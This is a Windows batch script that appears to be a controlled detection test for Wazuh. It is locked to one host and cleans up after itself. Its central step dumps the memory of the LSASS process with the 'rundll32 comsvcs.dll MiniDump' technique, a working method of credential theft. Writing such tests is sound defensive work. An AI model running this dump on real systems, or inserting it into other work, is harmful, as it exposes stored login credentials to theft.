@echo off
setlocal EnableExtensions EnableDelayedExpansion

if /I not "%COMPUTERNAME%"=="WIN01" (
  echo ERROR: This test is locked to WIN01. Current host: %COMPUTERNAME%
  exit /b 10
)

net session >nul 2>&1
if errorlevel 1 (
  echo ERROR: Run from CMD as Administrator.
  exit /b 11
)

set "DUMP=C:\Windows\Temp\WAZUH_LSASS_CONTROLLED.dmp"
del /f /q "%DUMP%" >nul 2>&1

set "LSASS_PID="
for /f "tokens=2" %%P in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do (
  set "LSASS_PID=%%P"
  goto :pid_found
)

:pid_found
if not defined LSASS_PID (
  echo ERROR: Could not find LSASS PID.
  exit /b 12
)

echo HOST=%COMPUTERNAME%
echo USER=%USERDOMAIN%\%USERNAME%
echo LSASS_PID=%LSASS_PID%
echo Starting controlled comsvcs MiniDump test...

rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %LSASS_PID% "%DUMP%" full
set "DUMP_EXIT=%ERRORLEVEL%"

echo COMMAND_EXIT=%DUMP_EXIT%
if exist "%DUMP%" (
  for %%F in ("%DUMP%") do echo DUMP_CREATED=True SIZE=%%~zF
) else (
  echo DUMP_CREATED=False
)

del /f /q "%DUMP%" >nul 2>&1
if exist "%DUMP%" (
  echo CLEANUP=False
  exit /b 20
) else (
  echo CLEANUP=True
)

exit /b %DUMP_EXIT%
